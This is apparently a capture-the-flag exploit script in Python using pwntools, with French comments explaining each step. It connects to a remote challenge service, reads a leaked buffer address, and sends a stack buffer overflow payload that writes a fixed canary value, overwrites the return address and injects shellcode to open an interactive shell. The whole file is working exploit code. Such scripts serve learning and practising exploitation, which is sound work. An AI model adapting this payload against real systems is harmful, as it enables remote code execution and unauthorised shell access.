#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=1)

p = remote("cytech.tcdn.casa", 4103)

# get buffer address
p.recvuntil(b"0x")  # on recoit jusqu'a voir 0x
buf_addr = int(
    p.recvlineS(), 16
)  # on recupere l'entier correspondant a l'adresse de buf

ret_offset = 39  # l'adresse de retour est 39 bytes apres l'adresse de buf
canary_offset = 15  # le canary est 15 bytes apres l'addresse dde buf
shellcode_addr = (
    buf_addr + ret_offset + 8
)  # on veut pointer 8 bytes apres l'addresse de retour (la ou on a met notre shellcode)
shellcode = asm(shellcraft.sh())  # on laisse pwnlib nous generer un shellcode

# flat() est pratique pour generer des payloads facilement.
payload = flat(
    {
        canary_offset: 0xCAFECAFECAFECAFE,  # le canary
        ret_offset: shellcode_addr,  # l'adresse de retour (qui va du coup pointer sur le shellcode
        ret_offset + 8: shellcode,  # le shellcode
    }
)

log.info("Payload:")
log.hexdump(payload)
p.sendlineafter(b"mot de passe:\n", payload)

p.interactive()
